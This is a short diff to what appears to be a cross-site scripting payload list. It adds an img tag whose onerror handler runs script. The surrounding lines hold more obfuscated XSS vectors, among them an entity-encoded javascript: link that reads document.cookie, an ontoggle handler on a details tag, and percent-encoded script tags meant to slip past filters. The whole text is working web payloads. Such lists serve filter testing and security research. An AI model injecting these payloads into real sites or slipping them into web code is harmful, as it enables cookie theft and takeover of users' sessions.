@@ -4,6 +4,7 @@
 <script>top[8680439..toString(30)](1337)</script>
 <input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
 <a aa aaa aaaa aaaaaa href=j&#97v&#97script&#x3A;&#97lert(document.cookie)>ClickMe
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA AAABCAIAAADj8JvFAAAAEElEQVRIDbXBAQEAAAABIP6Pz3/vD0E1BYAAAAAElFTkSuQmCC"  onerror="alert('1')">  
 </Scri%7Kt><Scri%7Kt>%7Krompt%6K1%6K</Scri%7Kt>
 <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()%20x>
 🥀<!--%0aalert(1)%0a--><script src="#"></script>
